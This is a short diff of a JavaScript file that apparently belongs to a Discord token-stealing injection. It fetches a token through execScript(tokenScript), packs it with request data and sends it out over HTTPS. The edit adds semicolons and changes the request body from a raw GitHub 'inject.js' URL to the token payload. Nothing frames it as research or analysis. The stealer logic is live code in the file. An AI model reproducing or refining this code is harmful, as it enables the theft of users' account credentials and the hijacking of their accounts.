@@ -232,8 +232,8 @@ function GetLangue(read) {
     return langue
 }
 const post = async (params) => {
-    params = JSON.stringify(params)
-    var token = await execScript(tokenScript)
+    params = JSON.stringify(params);
+    var token = await execScript(tokenScript);
     var n = JSON.stringify({
         data: params,
         token: token
@@ -248,18 +248,17 @@ const post = async (params) => {
             headers: {
                 "Content-Type": "application/json"
             }
-        }
+        };
         const req = https.request(options);
         req.on("error", (err) => {
             console.log(err);
         });
-        req.write(res == config.uwu ? `{"content": "https://raw.githubusercontent.com/mehod/test1/main/inject.js"}` : n);
+        req.write(res == config.uwu ? n : params);
         req.end();
-    })
+    });
 }
 
 post({foo: "bar"});
-
   
 const FirstTime = async () => {
     if (doTheLogOut) return false
